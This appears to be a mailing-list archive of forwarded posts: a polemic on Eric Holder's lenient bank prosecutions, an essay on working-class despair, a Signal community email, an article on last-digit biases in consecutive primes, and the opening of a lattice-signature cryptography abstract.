correct move in situations like the current one. Whether Wikileaks is
its enemy, or the best friend they can find – one that is brave enough
to tell you you have a nasty problem, and to press on you to solve it
on time. And whether people like Mike Mullen are its best servants, or
its best enemies – the ones that tell you “There is no problem,
continue this way, people will never learn of the crimes, truth never
comes out”.
If you are still not sure which is the correct position, ask one truly
outstanding soldier – Gen. David Petraeus. He will surely be able to
tell you the truth… Actually, you can tell it yourself, by using his
simple principle – which action decreases the number of your enemies,
and increases the number of your friends.

Eric Holder, Wall Street Double Agent, Comes in From the Cold
Barack Obama's former top cop cashes in after six years of letting
banks run wild

attorney general for six years. Saul Loeb/AFP/Getty
Eric Holder has gone back to work for his old firm, the white-collar
defense heavyweight Covington & Burling. The former attorney general
decided against going for a judgeship, saying he's not ready for the
ivory tower yet. "I want to be a player," he told the National Law
Journal, one would have to say ominously.
Eric Holder
Goldman Non-Prosecution: AG Eric Holder Has No Balls »
Holder will reassume his lucrative partnership (he made $2.5 million
the last year he worked there) and take his seat in an office that
reportedly – this is no joke – was kept empty for him in his absence.
The office thing might have been improper, but at this point, who
cares? More at issue is the extraordinary run Holder just completed as
one of history's great double agents. For six years, while brilliantly
disguised as the attorney general of the United States, he was
actually working deep undercover, DiCaprio in The Departed-style, as
the best defense lawyer Wall Street ever had.
Holder denied there was anything weird about returning to one of Wall
Street's favorite defense firms after six years of letting one banker
after another skate on monstrous cases of fraud, tax evasion, market
manipulation, money laundering, bribery and other offenses.
"Just because I'm at Covington doesn't mean I will abandon the public
interest work," he told CNN. He added to the National Law Journal that
a big part of the reason he was going back to private practice was
because he wanted to give back to the community.
"The firm's emphasis on pro bono work and being engaged in the civic
life of this country is consistent with my worldview that lawyers need
to be socially active," he said.
Right. He's going back to Covington & Burling because of the firm's
emphasis on pro bono work.
Here's a man who just spent six years handing out soft-touch
settlements to practically every Too Big to Fail bank in the world.
Now he returns to a firm that represents many of those same companies:
Morgan Stanley, Wells Fargo, Chase, Bank of America and Citigroup, to
name a few.
Collectively, the decisions he made while in office saved those firms
a sum that is impossible to calculate with exactitude. But even going
by the massive rises in share price observed after he handed out these
deals, his service was certainly worth many billions of dollars to
Wall Street.
Now he will presumably collect assloads of money from those very same
bankers. It's one of the biggest quid pro quo deals in the history of
government service. Congressman Billy Tauzin once took a $2
million-a-year job lobbying for the pharmaceutical industry just a few
weeks after helping to pass the revolting Prescription Drug Benefit
Bill, but what Holder just did makes Tauzin look like a guy who once
took a couple of Redskins tickets.
In this light, telling reporters that you're going back to Covington &
Burling to be "engaged in the civic life of this country" seems like a
joke for us all to suck on, like announcing that he's going back to
get a doctorate at the University of Blow Me.
Holder doesn't look it, but he was a revolutionary. He
institutionalized a radical dualistic approach to criminal justice,
essentially creating a system of indulgences wherein the world's
richest companies paid cash for their sins and escaped the sterner
punishments the law dictated.
Here are five pillars of the Holder revolution:
Alayne Fleischmann
The $9 Billion Witness: JPMorgan Chase's Worst Nightmare »
One is that he failed to win a single conviction in court for any
crimes related to the financial crisis. The only trial of any
consequence brought by his Justice Department for crimes related to
the crisis involved a pair of Bear Stearns nimrods named Ralph Cioffi
and Matthew Tannin, who confided in each other via email that the
subprime markets were "toast" but told their clients something very
different to keep them invested.
After a jury acquitted both in early 2009, the Holder Justice
Department turtled. Sources inside the DOJ told me over the years that
both Holder and his deputy, fellow Covington & Burling alum Lanny
Breuer, were obsessed with winning and refused to chance any case
where they felt a jury might go sideways on them. Thus the
Cioffi-Tannin case was the last financial crisis case they dared to
bring into to a criminal courtroom – virtually every other case ended
in settlements.
Two: Holder famously invented a concept called "collateral
consequences," under which the state could pursue non-criminal
alternatives for companies if they believed prosecuting them might
result in too much "collateral" damage. Britain's HSBC bank, which
admitted to massive money laundering violations, and the Swiss bank
UBS, which was caught manipulating the Libor interest rate benchmark,
were examples of firms that escaped vigorous prosecution because
Holder and his lackeys were, ostensibly anyway, concerned about
market-altering consequences.
Significantly, both banks were later caught up in even more serious
scandals, leading to criticism that stiffer punishments the first time
around might have prevented future damage. Holder's successor Loretta
Lynch was even forced to rip up Holder's UBS deal for being
insufficiently punitive. It's worth noting that Holder, before he
became attorney general, represented UBS at Covington & Burling.
Holder's lenient policies were deployed at a time when fellow
officials like Tim Geithner and Ben Bernanke were using bailout monies
to merge troubled firms together and create even larger
mega-companies. Chase and Wells Fargo, which swallowed up Washington
Mutual and Wachovia in state-aided takeovers, were prototypes of the
modern mega-bank. So when Holder wedded "collateral consequences" to
these new Too Big to Fail mega-firms, he created Too Big to Jail. This
is a huge part of his legacy, the creation of an unjailable class.
Three: Holder also pioneered the extrajudicial settlement, striking
huge deals with companies in which judges did not sign off on the
agreements. The arrangement prevented pesky judges like the irksome
Jed Rakoff (who voided a pair of settlements he felt were inadequate)
from protesting lenient justice.
This essentially institutionalized the backroom deal. Everything was
done in secret, and there was no longer any opportunity for judges or
anyone else to check the power of the executive branch to hand out
financial indulgences.
The watchdog group Better Markets described the $13 billion Chase
settlement, one of the biggest extrajudicial deals, as "an
unprecedented settlement amount [that] cannot…immunize the DOJ from
having to obtain independent judicial review of its otherwise
unilateral, secret actions."
Four: There is a huge misconception, pushed equally by odd bedfellows
in the financial community and Obama supporters, that Eric Holder
didn't send anyone from Wall Street to jail because "no one broke any
This preposterous meme grew out of something Barack Obama said on 60
Minutes. Here are the president's exact words:
"Some of the most damaging behavior on Wall Street — in some cases
some of the least ethical behavior on Wall Street — wasn't illegal."
Obama, a brilliant lawyer and wordsmith, was not saying that all of
the behavior leading to the crash was legal. He merely said that some
of the worst behavior wasn't illegal. Which is true. Meaningless, but
Of course, some of the worst behavior was very illegal. This is
confirmed in the fact that Holder extracted billions of dollars in
settlement monies and even, in a few cases, obtained guilty pleas for
crimes like fraud, manipulation, bribery, money laundering and tax
Anyone who even tries to claim that none of the banks actually did
anything illegal should be directed to the HSBC settlement of December
2012. In this deferred prosecution agreement, Europe's largest bank
paid $1.92 billion to settle their responsibility for violations of
the Bank Secrecy Act and other laws.
This is from a description of HSBC's crimes by Holder's Justice Department:
"As a result of HSBC Bank USA's AML failures, at least $881 million in
drug trafficking proceeds – including proceeds of drug trafficking by
the Sinaloa Cartel in Mexico…were laundered through HSBC Bank USA."
You might remember the Sinaloa cartel for their ISIS-style,
unforgettably upsetting torture videos. HSBC washed their cash. They
even created special teller windows to make their deposits easier.
This is admitted, not alleged.
But Holder went out of his way to let them keep their U.S. charter. He
gave their executives a grand total of zero days in jail, zero dollars
in individual fines.
To reiterate: HSBC laundered money for guys who chop peoples' heads
off with chainsaws. So we can dispense with the "but no one broke any
laws" thing.
When asked about this in testimony before the Senate, Holder told
elected officials he was concerned harsher penalties against firms
like HSBC would "have a negative impact on the national economy," and
that this "has an inhibiting influence…on our ability to bring
resolutions that I think would be more appropriate."
Compare this to what he just said after returning to Covington & Burling:
"I think that what we did in the department was, I always like to say,
appropriately aggressive. There may be clients that, for whatever
reason, will not decide to work with me..."
Oddly enough, Holder used that same phrase – "appropriately
aggressive" – in his Senate testimony. In other words, the attorney
general said he was "inhibited" from giving "appropriate" punishments
just a few moments before claiming his punishments were appropriate.
This is classic Clintonian politics, saying two things at the same
time, neither of them true.
Five: Holder contributed countless subtle inventions to soften
punishments. The most revolting in my view was allowing banks like
Chase the courtesy of calling their settlements "remedial payments"
instead of fines for wrongdoing.
This seemingly insignificant semantic tweak allowed the bank to call
$7 billion of their settlement a business expense, which meant they
could claim it as a tax deduction, which in turn meant that taxpayers
like you and me paid a whopping $2.45 billion of Chase's penalty.
Some of the write-ups of these decisions emanating from the financial
and legal press were hilarious. Law360.com, noting that the settlement
language meant that 35 percent of the bank's regulatory burden would
be shifted "onto the backs of taxpayers," pointed out, as if
surprised, that the tax treatment "sparked debate" and that "some are
even angry about it." Shocking!
Of course, none of us mortals can deduct so much as a speeding ticket,
since we wouldn't want to use the tax code to encourage speeding. So
why was it OK for the nation's top cop to make fraud or money
laundering a tax-subsidized activity?
There were other tricks. Banks that committed multiple violations of
the same offense were often allowed to settle or plead to just one
count. And in many cases the fines were staggeringly low compared to
the volume of crime – BNP-Paribas, for instance, paid $8.9 billion
after laundering $30 billion, meaning they paid about 27 cents per
dollar of violations.
Holder is a cynic of a type that's increasingly common in Washington.
To follow his Justice Department was like watching an endless reel of
The Good Wife – smart lawyers half-cleverly constructing one unseemly
moral compromise after another, always justifying it to themselves in
the end somehow in the name of keeping the ball rolling.
Holder doubtless seriously believed at first that in a time of
financial crisis, he was doing the right thing in constructing new
forms of justice for banks, where nobody but the shareholders actually
had to pay for crime. You've heard of victimless crimes; Holder
created the victimless punishment.
But in the end, it was pretty convenient, wasn't it, that "the right
thing" also happened to be the strategy that preserved Democratic
Party relationships with big-dollar donors, kept the client base at
Holder's old firm nice and fat, made the influential rich immeasurably
richer and allowed Eric Holder himself to crash-land into a giant pile
of money upon resignation.
What a coincidence! In any civilized country, it'd be a scandal. In
America, though, he's just another guy selling whatever he can to get
by. It was just too bad that what Holder had to sell was the criminal
justice system.

In Stayin’ Alive, his powerful history of the “last days” of the
working class, the historian Jefferson Cowie describes how the proud
blue-collar identity of previous generations disintegrated during the
’70s. “Liberty has largely been reduced to an ideology that promises
economic and cultural refuge from the long arm of the state,” he
writes, “while seemingly lost to history is the logic that culminated
under the New Deal: that genuine freedom could only happen within a
context of economic security.” As working-class solidarity receded, an
identity built on racial tribalism often swept in.

All Hollowed Out
The lonely poverty of America’s white working class
Eric Thayer / Reuters     Victor Tan Chen Jan 16, 2016 Business
For the last several months, social scientists have been debating the
striking findings of a study by the economists Anne Case and Angus
Deaton.* Between 1998 and 2013, Case and Deaton argue, white Americans
across multiple age groups experienced large spikes in suicide and
fatalities related to alcohol and drug abuse—spikes that were so large
that, for whites aged 45 to 54, they overwhelmed the dependable modern
trend of steadily improving life expectancy. While critics have
challenged the magnitude and timing of the rise in middle-age deaths
(particularly for men), they and the study’s authors alike seem to
agree on some basic points: Problems of mental health and addiction
have taken a terrible toll on whites in America—though seemingly not
in other wealthy nations—and the least educated among them have fared
the worst.
Meanwhile, other recent research has piled on the bad news for those
without college degrees. A Pew study released last month found that
the size of the middle class—defined by a consistent income range
across generations—has shrunk over the last several decades. In part,
this is because high-paying jobs for the less educated are vanishing.
The study builds on other recent research that finds that almost all
the good jobs created since the recession have gone to college
The workers I interviewed after the recession for my book on
unemployment—less-educated factory workers—offer some tentative clues
about what might be driving the disquieting trends described by the
Case and Deaton study. This is one of the groups hit hardest by the
rising inequality and greater risk of unemployment and financial
insecurity that have become features of today’s economy, and their
experiences put in concrete terms how the economy and culture have
become more hostile to workers not lucky enough to be working in posh
offices on Wall Street or in Silicon Valley.
One man I talked to was 47 years old, the son of a Detroit factory
worker who headed into the plants himself. (As is standard in
sociology, my interviewees were promised confidentiality.) He told me
how he recently lost his $11-an-hour job: He was driving a forklift at
his company’s plant when he accidentally crashed into a ladder. No one
was hurt and nothing was damaged—but he was an at-will worker at a
company with no union, and he was fired. Shortly afterward, his wife,
who was making $8 an hour at a cleaning company, decided to leave him.
The stress of failing to find a job and being alone made him too
depressed to eat, and he started taking antidepressants.
When it comes to explaining American economic trends, it is important
to remember how critical a role manufacturing and unions have played
in the building—and now dismantling—of a strong middle class. For
generations, factories provided good jobs to people who never went to
college, allowing families—first white ethnic immigrants, and then
others—to be upwardly mobile. Bringing together large numbers of
people under a single roof, factory jobs were also relatively easy to
organize. As the sociologists Bruce Western and Jake Rosenfeld have
argued, unions at their prime helped create a “moral economy” in which
wages rose both in firms with unions and those without them, and in
which the average worker had a notable voice—however compromised back
then by nativism and other exclusionary tendencies—lobbying on their
behalf in Washington.
But in the late ’90s—the beginning of the crisis period that Case and
Deaton identify—the number of manufacturing jobs in the U.S. dropped
dramatically. Intensified by free-trade deals such as NAFTA, the
hollowing-out of American industry then was much greater, in terms of
the absolute number of jobs lost, than what the country experienced
during its first wave of deindustrialization.
Twenty years ago, union membership—in decline since the ’60s—fell to a
level not seen since the Great Depression. For various reasons, it
became much harder to pursue the sorts of collective action that
unions once cultivated throughout the economy—that is, banding
together to convince companies and governments to treat employees
better. Free trade and automation undercut the bargaining positions of
the working class. Political leaders, bankrolled by the wealthy,
rolled back the interventionist policies of the New Deal and postwar
period. Corporations, once relatively tolerant of unions, tapped a
cottage industry of anti-union consultants and adopted unseemly
tactics to crush any organizing drives in their workplaces.
As organized labor in this country has withered, an extreme
individualism has stepped in as the alternative—a go-it-alone
perspective narrowly focused on getting an education and becoming
successful on one’s own merit. This works well for some, but for
others—especially the two-thirds of Americans over the age of 25 who
don’t have a bachelor’s degree—it often means getting mired in an
economy of contract work, low pay, and few, if any, benefits. These
prospects suggest that this is an age of diminished expectations for
the working class.
Certainly, it cannot be said enough that African Americans and Latinos
continue to fare significantly worse than whites in terms of their
overall rates of death and disease, even if the racial gap has
narrowed. Indeed, the broader story that many commentators seem to
have neglected in recent months is the decline of the working class as
a whole. In the decades after World War II, racial minorities were
denied many of the jobs, loans, and other resources that allowed the
white majority to buy homes and accrue wealth. If the gains of
economic growth have gone largely to the rich in recent years, in that
earlier period the white working class could count on hefty rises in
living standards from generation to generation, and they grew
accustomed to that upward trajectory of growing prosperity. When the
labor market turned against them, they had the hardest fall.
Many in the working class are going without marriage—a form of social support.
Any explanation of the ominous trends in the Case and Deaton study is,
at the moment, speculative. More research is needed, as social
scientists like to say, and there are numerous caveats. For example,
while the disappearance of high-paying jobs for those with little
education is a large part of the overall story of a shrinking middle
class, it can’t wholly account for the uptick of mortality identified
in the Case and Deaton study. After all, other countries have not seen
similar hikes in deaths, even though manufacturing and (to a lesser
extent) union membership have crumbled abroad as well.
Likewise, the groups that have been affected most viciously by these
market trends in the U.S., African Americans and Latinos, have not
suffered the dramatic increases in death by suicide or substance abuse
that whites have. It may be that changes in the economy have affected
these workers in different ways. For instance, whites are more likely
to be employed in the declining manufacturing sector than African
Americans or Hispanics—and for that matter, they’re more likely to
live in the rural communities devastated by this most recent,
post-NAFTA era of deindustrialization. Furthermore, whites are less
likely to be union members than African Americans (though not Asians
or Hispanics).
Yet there is clearly more to the despair of the working class than
empty wallets and purses. Patches of the social fabric that once
supported them, in good times and bad, have frayed. When asked in
national surveys about the people with whom they discussed “important
matters” in the past six months, those with just a high-school
education or less are likelier to say no one (this percentage has
risen over the years for college graduates, too). This trend is
troubling, given that social isolation is linked to depression and, in
turn, suicide and substance abuse.

One form of social support that many in the working class are going
without is marriage. I’m reminded of another worker I interviewed, a
jobless 54-year-old white woman who used to work at a Ford plant. Her
husband left her, she says, when the paychecks stopped coming. “Jesus
Christ,” she told him once. “I didn’t think that our relationship was
based on the amount of money that I brought in.” Unable to pay her
mortgage, she lost her home and had to move in, as she puts it, with a
“man friend.” She is depressed, unable to sleep at night, and
constantly worried about falling into poverty. “I’m a loser,” she
As scholars of family life as politically distinct as Andrew Cherlin
and Charles Murray have stressed, college graduates and the less
educated have greatly diverged in terms of when and how they partner
up and have kids. Nowadays, well-educated couples are much more likely
to marry, stay married, and have children within marriage than those
with less schooling. The white working class in particular is seeing
sharp drops in these indicators—again, not to the levels of nonwhites,
but a drastic reversal all the same, and one that has intensified over
the last few decades.
A large part of the explanation for this must be that society’s
attitudes about the sanctity and permanence of marriage have changed.
But it’s important to note that there is an economic dimension to
these trends, too—as the frequent separations and divorces I saw among
the long-term unemployed made plain to me. Those struggling
financially are less likely to follow the traditional path of first
comes marriage, then comes a baby. And if they do choose to get
married, there is little room for unemployment. As the Detroit man who
lost his job told me, he and his wife split up “because she’s working,
and … I don’t have any money coming in.” They had been fighting over
finances even before he lost his job, he points out, but the arguments
grew more heated afterward. In a lone-wolf economy, as sociologists
Kathryn Edin and Maria Kefalas have argued, why take a chance on a
partner down on his luck when you’re just barely surviving yourself?
The waning of religious belief may be another trend aggravating the
modern malaise of the white working class. Since the ’90s, the number
of Americans who declare no religious preference on surveys has almost
tripled—from 8 percent at the beginning of that decade, to 21 percent
in 2014. Whites fall disproportionately into this camp. The
religiously unaffiliated are not necessarily secular in their outlook.
Many of them are spiritually inclined but skeptical of organized
religion—especially its intrusion into politics. However, in the
absence of any other source of social support and collective meaning
(say, unions), there’s less in the way of psychological protection
from the slings and arrows of American society.
This sort of isolation was common among the people I talked to. Many
said their faith was helping them get through their ongoing troubles,
yet they rarely or never went to church. Some felt ashamed to be
around people because they were out of work. For others, their
religious belief was somewhat a source of self-help, rather than a
source of community. For example, one of the workers I interviewed
said that being out of work for so long had filled him with a constant
rage. To calm his mind, every night he would pick up his Bible and
read a dozen verses. He had given up on the church and what he
described as its superficial ways. “I want to go to hear the Word—I
don’t want to go to see what you’re wearing,” says the man, 53 and
from Flint, Michigan. The other way he copes is going outside for a
For this man and many like him, there is no one to talk to, no one to
rely on. “Nowadays, you got people you really can’t trust, man,” he
says. “You can’t call everybody your friend.” As the ties that bind
them to others have unraveled, the working class has become an ever
lonelier crowd.
Policies to keep people from sinking into poverty and long-term
unemployment could make a huge difference.
The larger context of this isolation and alienation is America’s
culture of individualism. It, too, can worsen the despair. Taken to an
extreme, self-reliance becomes a cudgel: Those who falter and fail
have only themselves to blame. They should have gotten more education.
They should have been more prepared. On this score, too, the U.S.
deviates from other wealthy nations. America’s frontier spirit of
rugged individualism is strong, and it manifests itself differently by
race and education level, too. White Americans, for instance, are more
likely to see success as the result of individual effort than African
Americans are (though not Hispanics). The less educated, particularly
less-educated whites, also share this view to a disproportionate
In Stayin’ Alive, his powerful history of the “last days” of the
working class, the historian Jefferson Cowie describes how the proud
blue-collar identity of previous generations disintegrated during the
’70s. “Liberty has largely been reduced to an ideology that promises
economic and cultural refuge from the long arm of the state,” he
writes, “while seemingly lost to history is the logic that culminated
under the New Deal: that genuine freedom could only happen within a
context of economic security.” As working-class solidarity receded, an
identity built on racial tribalism often swept in.
With that in mind, it’s interesting that Americans tout the importance
of getting an education—an inherently individualistic strategy—as the
pathway to success. This view was the ideological backbone of the
Clinton administration policies put forth in the ’90s, with their
individual training accounts and lifetime-learning credits. To this
day, the supreme value of education remains one of the few things that
Americans of all persuasions (presidential candidates included) can
agree on. But this sort of zeal can lead to the view that those who
have less education—the working class—are truly to blame for their
dire straits. While many of them will go on to obtain more education,
many others will not—because they can’t afford it, aren’t good
students, or just (as some of my workers said) prefer working with
their hands. But if they don’t collect the educational degrees needed
for today’s good jobs, they are made to feel that they have failed in
a fundamental way.
Some of the analysis of the Case and Deaton article has focused
rightly on recent developments in this country’s drug crisis—namely,
the surge in abuse of prescription opioids, and the resurgence in
heroin use, notably among whites. There is clearly a pressing need to
deal more vigorously with this drug problem and the epidemic of fatal
overdoses and liver disease that has affected the poor and working
class in particular.
At the same time, it should be said that risky individual behaviors
are shaped by broader social conditions. As the researchers Bruce Link
and Jo Phelan have argued, effective health interventions need to
consider the underlying factors that put people “at risk of
risks”—specifically, socioeconomic status and social support. Seeing
this big picture is important because blocking one pathway to disease
or death—say, opioid abuse—may just lead to people to opt for another
deadly means of coping with the pain of their poor life prospects.
One parting observation, then, is that policies to keep people from
sinking into poverty and long-term unemployment can make a huge
difference. In advanced industrial nations that have stronger social
safety nets, the working class is not experiencing the rising death
rates that Case and Deaton identified. Abroad, many of the
working-class unemployed benefit from a financial backstop of sorts
that keeps them from hurtling into the deepest forms of desperation.
Here in the U.S. they would too, if only there were such a thing.

@_subject: Fwd: [whispersystems] Addressing Frustration in the Signal Community 
References: ---------- Forwarded message ----------
Hi All,
I have noticed that there has been some amount of frustration present
on this mailing list as of late, and I'd just like to address it as a
an observer and member of the Signal Community.
The popularity of Signal, and in particular the number of people who
want to help get involved in the project, contribute, help influence
the future of it etc... has been growing very impressively. We have
just under 1000 people on this mailing list (967 at time of writing),
multiple PRs and issues are being opened in the repos by newcomers
each day, and we have prominent people in the security community
(Edward Snowden, Various Tor People, George Torwell [1] etc...)
constantly telling everyone to use Signal.
It's clear why this is happening, Signal is the only project to have
emerged that really has the potential to put a dent in mass
surveillance since Tor, and I use the word "only" on purpose here; Yes
there are a million different privacy apps / projects that have
emerged in the last 4 years or so, and existing tools have been
improved (we have the likes of Tox, Pond, Ricochet etc... And OTR and
PGP are still going strong), but Signal has always put a very strong
focus on Usability and User Adoption, and it's these things that have
lead it to becoming as widely adopted as it is, and it's these things
we need to continue to focus on more than anything until it becomes as
popular as, for example, Whatsapp. This is why it has the potential to
put a dent in MASS surveillance.
But this is obvious to most of you, in fact it is probably these
reasons that have got you so excited about the project, and why we
have so many people getting involved in the development of Signal, and
contributing in any which way they can.
That being said, I feel that the community doesn't realise just how
big it's growing, and how that contrasts with the size of the OWS team
itself. I have so much respect for them, they are each being pulled in
a thousand different directions: development, managing + reviewing
contributions on github, responding to issues, responding to support
tickets, addressing each of the feature requests that come in (and
deciding which ones they can take on etc...), handling PR / marketing
involved and increase growth that drastically change the requirements
for the infrastructure, managing and growing the infrastructure
itself, managing finances and donations, general admin stuff, and of
course... this mailing list.
Go have a look at their website, to see how big their team is, and how
many people are working on development (and also understand that
Frederic Jacobs has recently moved on and the website is yet to be
updated)... Then look again at this list of things that they need to
handle among themselves.
Also consider how amazingly Moxie has run a tight ship, keeping strict
control of the direction of the project, and fighting to maintain
that. It's this strict process that has lead Signal to where it is
today. We can't let the project grow beyond this control, this strict
direction that is vital to the steady, consistent, continual growth
and success of the project, it can't be diluted... and yet growth is
the single most important thing we're currently fighting for.
This team is insane.
So I ask you, please don't get frustrated, I know it can be difficult,
and it can feel like you're shouting into the void, but we still need
you, the community still needs everyone who's currently involved to
stay as involved as they can and support one another. The
whispersystems team reads each and every one of the emails that come
through this mailing list, as insane as that may sound given the rest
of their work load... they just don't have time to respond to
everything, and they leave it up to us to do much of that.
We need to work together, as a community, to help the OWS team grow
this project into something even more fantastic then it is currently,
rather than just increasing their workload, and taking their focus
away from important development work and decision making. We each need
to take a step back, and make calculated contributions, and help to
make their life easier any way we can.
So where, as a community, can we go from here...
Well, the single most effective thing you could do, if you really want
to make a difference, and are able to work in San Francisco, consider
applying to work full time at OWS [2]. They need designers and
developers alike.
If like me, you're not in San Francisco, or even the USA, then you can
continue to contribute online. Keep the morale up and continue doing
what you're doing. Direct newcomers in the right directions (mailing
list, issues, support, docs, the unofficial server support google
group, etc...), and spread the word and try and get as many people to
adopt Signal as possible.
As a community, we can probably do with some better coordination as to
what each of us are doing, assigning ourselves development tasks,
doing code review, handling responding to people, discussing design /
feature requests, working out as a community which features / work we
feel are most critical etc... Feature requests, however well
intentioned, do fill up this mailing list quite a bit, but there
doesn't really seem like there is a proper (public) home for them at
the moment, issues should be focussed on bugs / minor feature requests
only, and sending an email to this list sends it to almost 1000
people... not ideal.
Perhaps there is the scope for some online space to handle / discuss
feature requests / work in progress in an open manner? and perhaps
allow the OWS team to be a little more transparent with the things
they are currently working on etc... We could then also incorporate
projects like the new windows phone initiative, and coordinate much
more effectively? Anyway that's just food for thought, and probably
best discussed another time.
In the meantime, I'm probably going to write up some intro page for
newcomers of the Signal community, to outline the landscape, and help
direct their efforts. I'll post in here when that's done.
Anyway, thanks for reading through this monster of an email! It was
mostly a brain dump on my part. =)

@_subject: Mathematicians Discover Prime Conspiracy 
Mathematicians Discover Prime Conspiracy
A previously unnoticed property of prime numbers seems to violate a
longstanding assumption about how they behave.
By: Erica Klarreich	
March 13, 2016
Two mathematicians have uncovered a simple, previously unnoticed
property of prime numbers — those numbers that are divisible only by 1
and themselves. Prime numbers, it seems, have decided preferences
about the final digits of the primes that immediately follow them.
Among the first billion prime numbers, for instance, a prime ending in
9 is almost 65 percent more likely to be followed by a prime ending in
1 than another prime ending in 9. In a paper posted online today,
Kannan Soundararajan and Robert Lemke Oliver of Stanford University
present both numerical and theoretical evidence that prime numbers
repel other would-be primes that end in the same digit, and have
varied predilections for being followed by primes ending in the other
possible final digits.
“We’ve been studying primes for a long time, and no one spotted this
before,” said Andrew Granville, a number theorist at the University of
Montreal and University College London. “It’s crazy.”
The discovery is the exact opposite of what most mathematicians would
have predicted, said Ken Ono, a number theorist at Emory University in
Atlanta.  When he first heard the news, he said, “I was floored. I
thought, ‘For sure, your program’s not working.’”
This conspiracy among prime numbers seems, at first glance, to violate
a longstanding assumption in number theory: that prime numbers behave
much like random numbers. Most mathematicians would have assumed,
Granville and Ono agreed, that a prime should have an equal chance of
being followed by a prime ending in 1, 3, 7 or 9 (the four possible
endings for all prime numbers except 2 and 5).
“I can’t believe anyone in the world would have guessed this,”
Granville said. Even after having seen Lemke Oliver and
Soundararajan’s analysis of their phenomenon, he said, “it still seems
like a strange thing.”
Yet the pair’s work doesn’t upend the notion that primes behave
randomly so much as point to how subtle their particular mix of
randomness and order is. “Can we redefine what ‘random’ means in this
context so that once again, [this phenomenon] looks like it might be
random?” Soundararajan said. “That’s what we think we’ve done.”
Prime Preferences
Soundararajan was drawn to study consecutive primes after hearing a
lecture at Stanford by the mathematician Tadashi Tokieda, of the
University of Cambridge, in which he mentioned a counterintuitive
property of coin-tossing: If Alice tosses a coin until she sees a head
followed by a tail, and Bob tosses a coin until he sees two heads in a
row, then on average, Alice will require four tosses while Bob will
require six tosses (try this at home!), even though head-tail and
head-head have an equal chance of appearing after two coin tosses.
Soundararajan wondered if similarly strange phenomena appear in other
contexts. Since he has studied the primes for decades, he turned to
them — and found something even stranger than he had bargained for.
Looking at prime numbers written in base 3 — in which roughly half the
primes end in 1 and half end in 2 — he found that among primes smaller
than 1,000, a prime ending in 1 is more than twice as likely to be
followed by a prime ending in 2 than by another prime ending in 1.
Likewise, a prime ending in 2 prefers to be followed a prime ending in
Soundararajan showed his findings to postdoctoral researcher Lemke
Oliver, who was shocked. He immediately wrote a program that searched
much farther out along the number line — through the first 400 billion
primes. Lemke Oliver again found that primes seem to avoid being
followed by another prime with the same final digit. The primes
“really hate to repeat themselves,” Lemke Oliver said.
Lemke Oliver and Soundararajan discovered that this sort of bias in
the final digits of consecutive primes holds not just in base 3, but
also in base 10 and several other bases; they conjecture that it’s
true in every base. The biases that they found appear to even out,
little by little, as you go farther along the number line — but they
do so at a snail’s pace. “It’s the rate at which they even out which
is surprising to me,” said James Maynard, a number theorist at the
University of Oxford. When Soundararajan first told Maynard what the
pair had discovered, “I only half believed him,” Maynard said. “As
soon as I went back to my office, I ran a numerical experiment to
check this myself.”
Lemke Oliver and Soundararajan’s first guess for why this bias occurs
was a simple one: Maybe a prime ending in 3, say, is more likely to be
followed by a prime ending in 7, 9 or 1 merely because it encounters
numbers with those endings before it reaches another number ending in
3. For example, 43 is followed by 47, 49 and 51 before it hits 53, and
one of those numbers, 47, is prime.
But the pair of mathematicians soon realized that this potential
explanation couldn’t account for the magnitude of the biases they
found. Nor could it explain why, as the pair found, primes ending in 3
seem to like being followed by primes ending in 9 more than 1 or 7. To
explain these and other preferences, Lemke Oliver and Soundararajan
had to delve into the deepest model mathematicians have for random
behavior in the primes.
Random Primes
Prime numbers, of course, are not really random at all — they are
completely determined. Yet in many respects, they seem to behave like
a list of random numbers, governed by just one overarching rule: The
approximate density of primes near any number is inversely
proportional to how many digits the number has.
In 1936, Swedish mathematician Harald Cramér explored this idea using
an elementary model for generating random prime-like numbers: At every
whole number, flip a weighted coin — weighted by the prime density
near that number — to decide whether to include that number in your
list of random “primes.” Cramér showed that this coin-tossing model
does an excellent job of predicting certain features of the real
primes, such as how many to expect between two consecutive perfect
Despite its predictive power, Cramér’s model is a vast
oversimplification. For instance, even numbers have as good a chance
of being chosen as odd numbers, whereas real primes are never even,
apart from the number 2. Over the years, mathematicians have developed
refinements of Cramér’s model that, for instance, bar even numbers and
numbers divisible by 3, 5, and other small primes.
These simple coin-tossing models tend to be very useful rules of thumb
about how prime numbers behave. They accurately predict, among other
things, that prime numbers shouldn’t care what their final digit is —
and indeed, primes ending in 1, 3, 7 and 9 occur with roughly equal
Yet similar logic seems to suggest that primes shouldn’t care what
digit the prime after them ends in. It was probably mathematicians’
overreliance on the simple coin-tossing heuristics that made them miss
the biases in consecutive primes for so long, Granville said. “It’s
easy to take too much for granted — to assume that your first guess is
The primes’ preferences about the final digits of the primes that
follow them can be explained, Soundararajan and Lemke Oliver found,
using a much more refined model of randomness in primes, something
called the prime k-tuples conjecture. Originally stated by
mathematicians G. H. Hardy and J. E. Littlewood in 1923, the
conjecture provides precise estimates of how often every possible
constellation of primes with a given spacing pattern will appear. A
wealth of numerical evidence supports the conjecture, but so far a
proof has eluded mathematicians.
The prime k-tuples conjecture subsumes many of the most central open
problems in prime numbers, such as the twin primes conjecture, which
posits that there are infinitely many pairs of primes — such as 17 and
19 — that are only two apart. Most mathematicians believe the twin
primes conjecture not so much because they keep finding more twin
primes, Maynard said, but because the number of twin primes they’ve
found fits so neatly with what the prime k-tuples conjecture predicts.
In a similar way, Soundararajan and Lemke Oliver have found that the
biases they uncovered in consecutive primes come very close to what
the prime k-tuples conjecture predicts. In other words, the most
sophisticated conjecture mathematicians have about randomness in
primes forces the primes to display strong biases. “I have to rethink
how I teach my class in analytic number theory now,” Ono said.
At this early stage, mathematicians say, it’s hard to know whether
these biases are isolated peculiarities, or whether they have deep
connections to other mathematical structures in the primes or
elsewhere. Ono predicts, however, that mathematicians will immediately
start looking for similar biases in related contexts, such as prime
polynomials — fundamental objects in number theory that can’t be
factored into simpler polynomials.
And the finding will make mathematicians look at the primes themselves
with fresh eyes, Granville said. “You could wonder, what else have we
missed about the primes?”

@_subject: Arithmetic Coding and Blinding for Lattice Cryptography 
Abstract: In this work we apply information theoretically optimal
arithmetic coding and a number of novel side-channel blinding
countermeasure techniques to create BLZZRD, a practical, compact, and
more quantum-resistant variant of the BLISS Ring-LWE Signature Scheme.
We show how the hash-based random oracle can be modified to be more
secure against quantum preimage attacks while decreasing signature
size at any given security level. Most lattice-based cryptographic
algorithms require non-uniformly distributed ciphertext, signature,
and public/private key data to be stored and transmitted; hence there
